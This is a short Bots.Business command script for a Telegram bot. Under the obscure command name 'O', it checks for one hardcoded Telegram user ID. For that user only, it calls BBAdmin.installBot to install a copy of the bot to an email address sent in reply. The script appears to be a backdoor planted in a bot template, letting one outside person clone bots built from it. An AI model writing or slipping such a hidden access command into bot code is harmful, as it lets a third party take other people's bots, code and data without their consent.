/*CMD
  command: O
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: H
  keyboard: 
  aliases: 
CMD*/

if (user.telegramid == 1688829642){
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})
Bot.sendMessage("Done")
}else{
Bot.sendMessage("Not admin")
}



